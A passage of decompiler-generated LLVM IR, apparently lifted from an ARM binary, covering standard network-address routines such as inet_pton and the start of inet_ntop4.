  store i1 %v7_18268, i1* %cpsr_z.global-to-local, align 1
  %v2_1826c = xor i1 %v7_18268, true
  %v3_1826c = and i1 %v2_18268, %v2_1826c
  br i1 %v3_1826c, label %dec_label_pc_182e8, label %dec_label_pc_18270

dec_label_pc_18270:                               ; preds = %dec_label_pc_18260
  %v0_18270 = load i32, i32* @lr, align 4
  %v2_18270 = icmp eq i32 %v0_18270, 0
  store i1 %v2_18270, i1* %cpsr_z.global-to-local, align 1
  %v1_18274 = trunc i32 %v4_18264 to i8
  store i8 %v1_18274, i8* %v1_18260, align 1
  %v0_18278 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18278, label %dec_label_pc_1827c, label %dec_label_pc_182b4.backedge

dec_label_pc_1827c:                               ; preds = %dec_label_pc_18270
  %v0_1827c = load i32, i32* @ip, align 4
  %v1_1827c = add i32 %v0_1827c, 1
  store i32 %v1_1827c, i32* @ip, align 4
  %v7_18280 = icmp eq i32 %v1_1827c, 4
  store i1 %v7_18280, i1* %cpsr_z.global-to-local, align 1
  %v0_18284 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18284, i32* @lr, align 4
  %v8_18288 = icmp sgt i32 %v1_1827c, 4
  br i1 %v8_18288, label %dec_label_pc_182e8, label %dec_label_pc_182b4.backedge

dec_label_pc_18290:                               ; preds = %dec_label_pc_18254
  %v7_18290 = icmp eq i32 %v0_18290, 46
  %v1_18298 = load i32, i32* @lr, align 4
  %v2_18298 = urem i32 %v1_18298, 2
  %storemerge12 = select i1 %v7_18290, i32 %v2_18298, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1829c = icmp eq i32 %storemerge12, 0
  store i1 %v2_1829c, i1* %cpsr_z.global-to-local, align 1
  %v0_182a0 = load i32, i32* @r5, align 4
  store i32 %v0_182a0, i32* @lr, align 4
  br i1 %v2_1829c, label %dec_label_pc_182e8, label %dec_label_pc_182a8

dec_label_pc_182a8:                               ; preds = %dec_label_pc_18290
  %v0_182a8 = load i32, i32* @ip, align 4
  %v7_182a8 = icmp eq i32 %v0_182a8, 4
  store i1 %v7_182a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_182a8, label %dec_label_pc_182e8, label %dec_label_pc_182b0

dec_label_pc_182b0:                               ; preds = %dec_label_pc_182a8
  %v1_182b0 = trunc i32 %v0_182a0 to i8
  %v2_182b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_182b0 = add i32 %v2_182b0, 1
  %v4_182b0 = inttoptr i32 %v3_182b0 to i8*
  store i8 %v1_182b0, i8* %v4_182b0, align 1
  %v5_182b0 = load i32, i32* %r1.global-to-local, align 4
  %v6_182b0 = add i32 %v5_182b0, 1
  store i32 %v6_182b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_182b4.backedge

dec_label_pc_182b4.backedge:                      ; preds = %dec_label_pc_182b0, %dec_label_pc_18270, %dec_label_pc_1827c
  %v0_182b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_182b4 = inttoptr i32 %v0_182b4 to i8*
  %v2_182b4 = load i8, i8* %v1_182b4, align 1
  %v3_182b4 = zext i8 %v2_182b4 to i32
  store i32 %v3_182b4, i32* @r3, align 4
  %v2_182b8 = icmp eq i8 %v2_182b4, 0
  store i1 %v2_182b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182b8, label %dec_label_pc_182b4.dec_label_pc_182c4_crit_edge, label %dec_label_pc_18254

dec_label_pc_182b4.dec_label_pc_182c4_crit_edge:  ; preds = %dec_label_pc_182b4.backedge
  %v0_182c4.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_182b4.dec_label_pc_182c4_crit_edge, %entry
  %v0_182c4 = phi i32 [ %v0_182c4.pre, %dec_label_pc_182b4.dec_label_pc_182c4_crit_edge ], [ 0, %entry ]
  %v7_182c4 = icmp eq i32 %v0_182c4, 3
  store i1 %v7_182c4, i1* %cpsr_z.global-to-local, align 1
  %v7_182c8 = icmp slt i32 %v0_182c4, 4
  br i1 %v7_182c8, label %dec_label_pc_182e8, label %dec_label_pc_182cc

dec_label_pc_182cc:                               ; preds = %dec_label_pc_182c4
  %v0_182cc = load i32, i32* @r4, align 4
  store i32 %v0_182cc, i32* @r0, align 4
  store i32 %v2_1823c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_182d8 = call i32 @memcpy()
  br label %dec_label_pc_182e8

dec_label_pc_182e8:                               ; preds = %dec_label_pc_18260, %dec_label_pc_1827c, %dec_label_pc_18290, %dec_label_pc_182a8, %dec_label_pc_182c4, %dec_label_pc_182cc
  %storemerge = phi i32 [ 1, %dec_label_pc_182cc ], [ 0, %dec_label_pc_182c4 ], [ 0, %dec_label_pc_182a8 ], [ 0, %dec_label_pc_18290 ], [ 0, %dec_label_pc_1827c ], [ 0, %dec_label_pc_18260 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_18224, i32* @r4, align 4
  store i32 %v6_18224, i32* @r5, align 4
  store i32 %v15_18224, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_182c4, { 1, 0 }
  uselistorder i32 %v3_182b4, { 2, 1, 0 }
  uselistorder i32 %v0_182b4, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_18264, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 0 }
  uselistorder label %dec_label_pc_182e8, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_182b4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18254, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_182f4 = load i32, i32* @r4, align 4
  %v6_182f4 = load i32, i32* @r5, align 4
  %v9_182f4 = load i32, i32* @r6, align 4
  %v12_182f4 = load i32, i32* @r7, align 4
  %v27_182f4 = load i32, i32* @lr, align 4
  %v7_18300 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_18300, label %dec_label_pc_18320, label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %entry
  %v7_18314 = icmp eq i32 %arg1, 10
  br i1 %v7_18314, label %dec_label_pc_18330, label %dec_label_pc_184e8

dec_label_pc_18320:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_18328 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_184f8

dec_label_pc_18330:                               ; preds = %dec_label_pc_18314
  %v2_18330 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1833c = bitcast i32* %stack_var_-56 to i8*
  %v3_1833c = call i32 @__GI_memset(i8* %v2_1833c, i32 0)
  %v0_18340 = load i32, i32* @r5, align 4
  %v1_18340 = inttoptr i32 %v0_18340 to i8*
  %v2_18340 = load i8, i8* %v1_18340, align 1
  %v3_18340 = zext i8 %v2_18340 to i32
  store i32 %v3_18340, i32* %r3.global-to-local, align 4
  %v7_18344 = icmp eq i8 %v2_18340, 58
  store i32 %v3_1833c, i32* @r6, align 4
  %v2_1834c = add i32 %v3_1833c, 16
  store i32 %v2_1834c, i32* %r8.global-to-local, align 4
  br i1 %v7_18344, label %dec_label_pc_18354, label %dec_label_pc_18360

dec_label_pc_18354:                               ; preds = %dec_label_pc_18330
  %v1_18354 = add i32 %v0_18340, 1
  %v2_18354 = inttoptr i32 %v1_18354 to i8*
  %v3_18354 = load i8, i8* %v2_18354, align 1
  %v4_18354 = zext i8 %v3_18354 to i32
  store i32 %v4_18354, i32* %r3.global-to-local, align 4
  store i32 %v1_18354, i32* @r5, align 4
  %v7_18358 = icmp eq i8 %v3_18354, 58
  br i1 %v7_18358, label %dec_label_pc_18360, label %dec_label_pc_184e0

dec_label_pc_18360:                               ; preds = %dec_label_pc_18354, %dec_label_pc_18330
  %v0_1836c = phi i32 [ %v1_18354, %dec_label_pc_18354 ], [ %v0_18340, %dec_label_pc_18330 ]
  store i32 -32952, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_18368 = load i32, i32* @r4, align 4
  %v2_18368 = add i32 %v0_18368, -32952
  store i32 %v0_1836c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_18368, i32* %stack_var_-64, align 4
  %v1_184443 = inttoptr i32 %v0_1836c to i8*
  %v2_184444 = load i8, i8* %v1_184443, align 1
  %v3_184445 = zext i8 %v2_184444 to i32
  store i32 %v3_184445, i32* @r4, align 4
  %v2_184486 = icmp eq i8 %v2_184444, 0
  br i1 %v2_184486, label %dec_label_pc_18450.thread, label %dec_label_pc_18380

dec_label_pc_18450.thread:                        ; preds = %dec_label_pc_18360
  store i32 %v3_1833c, i32* @r4, align 4
  br label %dec_label_pc_1847c

dec_label_pc_18380:                               ; preds = %dec_label_pc_18360, %dec_label_pc_18444.backedge.dec_label_pc_18380_crit_edge
  %v0_18384 = phi i32 [ %v3_18444, %dec_label_pc_18444.backedge.dec_label_pc_18380_crit_edge ], [ %v3_184445, %dec_label_pc_18360 ]
  %v2_18380 = phi i32 [ %v2_18380.pre, %dec_label_pc_18444.backedge.dec_label_pc_18380_crit_edge ], [ %v2_18368, %dec_label_pc_18360 ]
  store i32 %v2_18380, i32* @r0, align 4
  %v1_18384 = or i32 %v0_18384, 32
  store i32 %v1_18384, i32* %r1.global-to-local, align 4
  %v2_18388 = call i32 @__GI_strchr(i32 %v2_18380, i32 %v1_18384)
  %v2_1838c = icmp eq i32 %v2_18388, 0
  %v0_18390 = load i32, i32* @r5, align 4
  %v1_18390 = add i32 %v0_18390, 1
  store i32 %v1_18390, i32* @r5, align 4
  br i1 %v2_1838c, label %dec_label_pc_183b4, label %dec_label_pc_18398

dec_label_pc_18398:                               ; preds = %dec_label_pc_18380
  %v2_18398 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_18398, i32* %r2.global-to-local, align 4
  %v2_1839c = sub i32 %v2_18388, %v2_18398
  %v1_183a0 = load i32, i32* @r7, align 4
  %v4_183a0 = mul i32 %v1_183a0, 16
  %v5_183a0 = or i32 %v4_183a0, %v2_1839c
  store i32 %v5_183a0, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_183a0, 65536
  br i1 %tmp36, label %dec_label_pc_18440, label %dec_label_pc_184e0

dec_label_pc_183b4:                               ; preds = %dec_label_pc_18380
  %v0_183b4 = load i32, i32* @r4, align 4
  %v7_183b4 = icmp eq i32 %v0_183b4, 58
  br i1 %v7_183b4, label %dec_label_pc_183bc, label %dec_label_pc_18414

dec_label_pc_183bc:                               ; preds = %dec_label_pc_183b4
  %v0_183bc = load i32, i32* %sb.global-to-local, align 4
  %v2_183bc = icmp eq i32 %v0_183bc, 0
  br i1 %v2_183bc, label %dec_label_pc_183c4, label %dec_label_pc_183d8

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183bc
  %v0_183c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_183c4 = icmp eq i32 %v0_183c4, 0
  br i1 %v2_183c4, label %dec_label_pc_183cc, label %dec_label_pc_184e0

dec_label_pc_183cc:                               ; preds = %dec_label_pc_183c4
  %v0_183cc = load i32, i32* @r6, align 4
  store i32 %v0_183cc, i32* %fp.global-to-local, align 4
  store i32 %v1_18390, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18444.backedge

dec_label_pc_183d8:                               ; preds = %dec_label_pc_183bc
  %v1_183d8 = inttoptr i32 %v1_18390 to i8*
  %v2_183d8 = load i8, i8* %v1_183d8, align 1
  %v3_183d8 = zext i8 %v2_183d8 to i32
  store i32 %v3_183d8, i32* %r3.global-to-local, align 4
  %v2_183dc = icmp eq i8 %v2_183d8, 0
  br i1 %v2_183dc, label %dec_label_pc_184e0, label %dec_label_pc_183e4

dec_label_pc_183e4:                               ; preds = %dec_label_pc_183d8
  %v0_183e4 = load i32, i32* @r6, align 4
  %v1_183e4 = add i32 %v0_183e4, 2
  store i32 %v1_183e4, i32* %r3.global-to-local, align 4
  %v1_183e8 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_183e4, %v1_183e8
  br i1 %tmp37, label %dec_label_pc_184e0, label %dec_label_pc_183f0

dec_label_pc_183f0:                               ; preds = %dec_label_pc_183e4
  %v0_183f0 = load i32, i32* @r7, align 4
  %v3_183f0 = udiv i32 %v0_183f0, 256
  store i32 %v3_183f0, i32* %r2.global-to-local, align 4
  store i32 %v0_183e4, i32* %r3.global-to-local, align 4
  %v1_183f8 = trunc i32 %v3_183f0 to i8
  %v3_183f8 = inttoptr i32 %v0_183e4 to i8*
  store i8 %v1_183f8, i8* %v3_183f8, align 1
  %v4_183f8 = load i32, i32* %r3.global-to-local, align 4
  %v5_183f8 = add i32 %v4_183f8, 1
  store i32 %v5_183f8, i32* @r3, align 4
  %v0_183fc = load i32, i32* @r7, align 4
  %v1_183fc = trunc i32 %v0_183fc to i8
  %v2_183fc = load i32, i32* @r6, align 4
  %v3_183fc = add i32 %v2_183fc, 1
  %v4_183fc = inttoptr i32 %v3_183fc to i8*
  store i8 %v1_183fc, i8* %v4_183fc, align 1
  store i32 0, i32* @r7, align 4
  %v0_18404 = load i32, i32* @r3, align 4
  %v1_18404 = add i32 %v0_18404, 1
  store i32 %v1_18404, i32* @r6, align 4
  %v0_18408 = load i32, i32* @r5, align 4
  store i32 %v0_18408, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18444.backedge

dec_label_pc_18414:                               ; preds = %dec_label_pc_183b4
  %v7_18414 = icmp eq i32 %v0_183b4, 46
  br i1 %v7_18414, label %dec_label_pc_1841c, label %dec_label_pc_184e0

dec_label_pc_1841c:                               ; preds = %dec_label_pc_18414
  %v0_1841c = load i32, i32* @r6, align 4
  %v1_1841c = add i32 %v0_1841c, 4
  store i32 %v1_1841c, i32* @r4, align 4
  %v1_18420 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1841c, %v1_18420
  br i1 %tmp38, label %dec_label_pc_184e0, label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_1841c
  %v0_18428 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_18428, i32* @r0, align 4
  store i32 %v0_1841c, i32* %r1.global-to-local, align 4
  %v3_18430 = call i32 @inet_pton4(i32 %v0_18428, i32 %v0_1841c)
  %v5_18438 = icmp sgt i32 %v3_18430, 0
  br i1 %v5_18438, label %dec_label_pc_18428.dec_label_pc_1847c_crit_edge, label %dec_label_pc_184e0

dec_label_pc_18428.dec_label_pc_1847c_crit_edge:  ; preds = %dec_label_pc_18428
  %v0_184c0.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1847c

dec_label_pc_18440:                               ; preds = %dec_label_pc_18398
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18444.backedge

dec_label_pc_18444.backedge:                      ; preds = %dec_label_pc_18440, %dec_label_pc_183cc, %dec_label_pc_183f0
  %v0_18444 = phi i32 [ %v1_18390, %dec_label_pc_18440 ], [ %v1_18390, %dec_label_pc_183cc ], [ %v0_18408, %dec_label_pc_183f0 ]
  %v0_1845012 = phi i32 [ 1, %dec_label_pc_18440 ], [ 0, %dec_label_pc_183cc ], [ 0, %dec_label_pc_183f0 ]
  %v1_18444 = inttoptr i32 %v0_18444 to i8*
  %v2_18444 = load i8, i8* %v1_18444, align 1
  %v3_18444 = zext i8 %v2_18444 to i32
  store i32 %v3_18444, i32* @r4, align 4
  %v2_18448 = icmp eq i8 %v2_18444, 0
  br i1 %v2_18448, label %dec_label_pc_18450, label %dec_label_pc_18444.backedge.dec_label_pc_18380_crit_edge

dec_label_pc_18444.backedge.dec_label_pc_18380_crit_edge: ; preds = %dec_label_pc_18444.backedge
  %v2_18380.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_18380

dec_label_pc_18450:                               ; preds = %dec_label_pc_18444.backedge
  %v0_18454.pre = load i32, i32* @r6, align 4
  %v2_18450 = icmp eq i32 %v0_1845012, 0
  store i32 %v0_18454.pre, i32* @r4, align 4
  br i1 %v2_18450, label %dec_label_pc_1847c, label %dec_label_pc_1845c

dec_label_pc_1845c:                               ; preds = %dec_label_pc_18450
  %v1_1845c = add i32 %v0_18454.pre, 2
  store i32 %v1_1845c, i32* %r3.global-to-local, align 4
  %v1_18460 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1845c, %v1_18460
  br i1 %tmp39, label %dec_label_pc_184e0, label %dec_label_pc_18468

dec_label_pc_18468:                               ; preds = %dec_label_pc_1845c
  store i32 %v0_18454.pre, i32* %r3.global-to-local, align 4
  %v0_1846c = load i32, i32* @r7, align 4
  %v3_1846c = udiv i32 %v0_1846c, 256
  store i32 %v3_1846c, i32* %r2.global-to-local, align 4
  %v1_18470 = trunc i32 %v3_1846c to i8
  %v3_18470 = inttoptr i32 %v0_18454.pre to i8*
  store i8 %v1_18470, i8* %v3_18470, align 1
  %v4_18470 = load i32, i32* %r3.global-to-local, align 4
  %v5_18470 = add i32 %v4_18470, 1
  store i32 %v5_18470, i32* @r3, align 4
  %v0_18474 = load i32, i32* @r7, align 4
  %v1_18474 = trunc i32 %v0_18474 to i8
  %v2_18474 = load i32, i32* @r6, align 4
  %v3_18474 = add i32 %v2_18474, 1
  %v4_18474 = inttoptr i32 %v3_18474 to i8*
  store i8 %v1_18474, i8* %v4_18474, align 1
  %v0_18478 = load i32, i32* @r3, align 4
  %v1_18478 = add i32 %v0_18478, 1
  store i32 %v1_18478, i32* @r4, align 4
  br label %dec_label_pc_1847c

dec_label_pc_1847c:                               ; preds = %dec_label_pc_18428.dec_label_pc_1847c_crit_edge, %dec_label_pc_18450.thread, %dec_label_pc_18450, %dec_label_pc_18468
  %v0_184c0.pre = phi i32 [ %v0_184c0.pre.pre, %dec_label_pc_18428.dec_label_pc_1847c_crit_edge ], [ %v3_1833c, %dec_label_pc_18450.thread ], [ %v0_18454.pre, %dec_label_pc_18450 ], [ %v1_18478, %dec_label_pc_18468 ]
  %v0_1847c = load i32, i32* %fp.global-to-local, align 4
  %v2_1847c = icmp eq i32 %v0_1847c, 0
  %v1_184c0.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1847c, label %dec_label_pc_184c0, label %dec_label_pc_18484

dec_label_pc_18484:                               ; preds = %dec_label_pc_1847c
  %v9_18484 = icmp eq i32 %v0_184c0.pre, %v1_184c0.pre
  %v2_18488 = sub i32 %v0_184c0.pre, %v0_1847c
  store i32 %v2_18488, i32* @ip, align 4
  br i1 %v9_18484, label %dec_label_pc_184e0, label %dec_label_pc_184a8.preheader

dec_label_pc_184a8.preheader:                     ; preds = %dec_label_pc_18484
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_184a8

dec_label_pc_1849c:                               ; preds = %dec_label_pc_184a8
  %v2_184b0 = sub i32 %v0_184bc, %v0_184b4
  %v0_1849c = load i32, i32* %fp.global-to-local, align 4
  %v2_1849c = add i32 %v0_1849c, %v2_184ac
  %v3_1849c = inttoptr i32 %v2_1849c to i8*
  %v4_1849c = load i8, i8* %v3_1849c, align 1
  %v6_1849c = zext i8 %v4_1849c to i32
  store i32 %v6_1849c, i32* @r3, align 4
  %v3_184a0 = inttoptr i32 %v2_184b0 to i8*
  store i8 %v4_1849c, i8* %v3_184a0, align 1
  %v0_184a4 = load i32, i32* @lr, align 4
  %v1_184a4 = trunc i32 %v0_184a4 to i8
  %v2_184a4 = load i32, i32* %fp.global-to-local, align 4
  %v3_184a4 = load i32, i32* %r1.global-to-local, align 4
  %v4_184a4 = add i32 %v3_184a4, %v2_184a4
  %v5_184a4 = inttoptr i32 %v4_184a4 to i8*
  store i8 %v1_184a4, i8* %v5_184a4, align 1
  %v0_184a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_184a8.pre = load i32, i32* @ip, align 4
  %v1_184b0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_184a8

dec_label_pc_184a8:                               ; preds = %dec_label_pc_184a8.preheader, %dec_label_pc_1849c
  %v0_184bc = phi i32 [ %v1_184c0.pre, %dec_label_pc_184a8.preheader ], [ %v1_184b0.pre, %dec_label_pc_1849c ]
  %v1_184ac = phi i32 [ %v2_18488, %dec_label_pc_184a8.preheader ], [ %v1_184a8.pre, %dec_label_pc_1849c ]
  %v0_184b4 = phi i32 [ 1, %dec_label_pc_184a8.preheader ], [ %v0_184a8.pre, %dec_label_pc_1849c ]
  %v2_184a8 = sub i32 %v0_184b4, %v1_184ac
  %v4_184a8 = xor i32 %v0_184b4, %v1_184ac
  %v5_184a8 = xor i32 %v2_184a8, %v0_184b4
  %v6_184a8 = and i32 %v5_184a8, %v4_184a8
  %v7_184a8 = icmp slt i32 %v6_184a8, 0
  %v8_184a8 = icmp slt i32 %v2_184a8, 0
  %v9_184a8 = icmp eq i32 %v0_184b4, %v1_184ac
  %v2_184ac = sub i32 %v1_184ac, %v0_184b4
  store i32 %v2_184ac, i32* %r1.global-to-local, align 4
  %v1_184b4 = add i32 %v0_184b4, 1
  store i32 %v1_184b4, i32* %r2.global-to-local, align 4
  %v3_184b8 = xor i1 %v8_184a8, %v7_184a8
  %v4_184b8 = or i1 %v9_184a8, %v3_184b8
  br i1 %v4_184b8, label %dec_label_pc_1849c, label %dec_label_pc_184bc

dec_label_pc_184bc:                               ; preds = %dec_label_pc_184a8
  store i32 %v0_184bc, i32* @r4, align 4
  br label %dec_label_pc_184c0

dec_label_pc_184c0:                               ; preds = %dec_label_pc_1847c, %dec_label_pc_184bc
  %v0_184c0 = phi i32 [ %v0_184bc, %dec_label_pc_184bc ], [ %v0_184c0.pre, %dec_label_pc_1847c ]
  %v1_184c0 = phi i32 [ %v0_184bc, %dec_label_pc_184bc ], [ %v1_184c0.pre, %dec_label_pc_1847c ]
  %v9_184c0 = icmp eq i32 %v0_184c0, %v1_184c0
  br i1 %v9_184c0, label %dec_label_pc_184c8, label %dec_label_pc_184e0

dec_label_pc_184c8:                               ; preds = %dec_label_pc_184c0
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_18330, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_184d4 = call i32 @memcpy()
  br label %dec_label_pc_184f8

dec_label_pc_184e0:                               ; preds = %dec_label_pc_18398, %dec_label_pc_183c4, %dec_label_pc_183e4, %dec_label_pc_183d8, %dec_label_pc_18484, %dec_label_pc_18428, %dec_label_pc_18414, %dec_label_pc_184c0, %dec_label_pc_18354, %dec_label_pc_1845c, %dec_label_pc_1841c
  br label %dec_label_pc_184f8

dec_label_pc_184e8:                               ; preds = %dec_label_pc_18314
  %v0_184e8 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_184f0 = inttoptr i32 %v0_184e8 to i32*
  store i32 97, i32* %v2_184f0, align 4
  br label %dec_label_pc_184f8

dec_label_pc_184f8:                               ; preds = %dec_label_pc_184e0, %dec_label_pc_184c8, %dec_label_pc_18320, %dec_label_pc_184e8
  %v1_18500 = phi i32 [ 0, %dec_label_pc_184e0 ], [ 1, %dec_label_pc_184c8 ], [ %v3_18328, %dec_label_pc_18320 ], [ -1, %dec_label_pc_184e8 ]
  store i32 %v3_182f4, i32* @r4, align 4
  store i32 %v6_182f4, i32* @r5, align 4
  store i32 %v9_182f4, i32* @r6, align 4
  store i32 %v12_182f4, i32* @r7, align 4
  store i32 %v27_182f4, i32* @lr, align 4
  ret i32 %v1_18500

; uselistorder directives
  uselistorder i32 %v2_184ac, { 1, 0 }
  uselistorder i32 %v2_184a8, { 1, 0 }
  uselistorder i32 %v0_184b4, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_184ac, { 1, 3, 0, 2 }
  uselistorder i32 %v0_184bc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_184c0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_184c0.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1846c, { 1, 0 }
  uselistorder i32 %v0_18454.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_18444, { 1, 0 }
  uselistorder i32 %v0_1841c, { 1, 0, 2 }
  uselistorder i32 %v3_183f0, { 1, 0 }
  uselistorder i32 %v0_183e4, { 1, 0, 2 }
  uselistorder i32 %v1_18390, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_18380, { 1, 0 }
  uselistorder i32 %v0_1836c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 2, 4, 5, 6, 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_184f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_184e0, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_184c0, { 1, 0 }
  uselistorder label %dec_label_pc_184a8, { 1, 0 }
  uselistorder label %dec_label_pc_1847c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_18444.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18380, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_185e8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_185c8 = add i32 %v2_185e8, -17
  br label %dec_label_pc_185e8

dec_label_pc_18538:                               ; preds = %dec_label_pc_185e8
  %v0_18538 = load i32, i32* %fp.global-to-local, align 4
  %v2_18538 = add i32 %v0_18538, %v1_18538
  %v3_18538 = inttoptr i32 %v2_18538 to i8*
  %v4_18538 = load i8, i8* %v3_18538, align 1
  %v6_18538 = zext i8 %v4_18538 to i32
  store i32 %v6_18538, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_18538, 100
  %v2_18540 = zext i8 %div4 to i32
  store i32 %v2_18540, i32* %r0.global-to-local, align 4
  %v1_18544 = or i8 %div4, 48
  %v3_18548 = add i32 %v2_185f8, -17
  %v4_18548 = inttoptr i32 %v3_18548 to i8*
  store i8 %v1_18544, i8* %v4_18548, align 1
  %v0_1854c = load i32, i32* %r5.global-to-local, align 4
  %v1_1854c = add i32 %v0_1854c, -17
  %v2_1854c = inttoptr i32 %v1_1854c to i8*
  %v3_1854c = load i8, i8* %v2_1854c, align 1
  %v0_18550 = load i32, i32* %r6.global-to-local, align 4
  %v1_18550 = add i32 %v0_18550, 1
  store i32 %v1_18550, i32* %r6.global-to-local, align 4
  store i32 %v2_185e8, i32* %r2.global-to-local, align 4
  %v7_18558 = icmp eq i8 %v3_1854c, 48
  %v0_18560 = load i32, i32* %r4.global-to-local, align 4
  %v0_18568 = load i32, i32* %fp.global-to-local, align 4
  %v1_18568 = load i32, i32* %sl.global-to-local, align 4
  %v2_18568 = add i32 %v1_18568, %v0_18568
  store i32 %v2_18568, i32* %sb.global-to-local, align 4
  %v2_18570 = udiv i32 %v0_18560, 10
  %v1_18578 = urem i32 %v2_18570, 256
  %v2_1857c = udiv i32 %v1_18578, 10
  %v3_1857c = urem i32 %v1_18578, 10
  store i32 %v2_1857c, i32* %r0.global-to-local, align 4
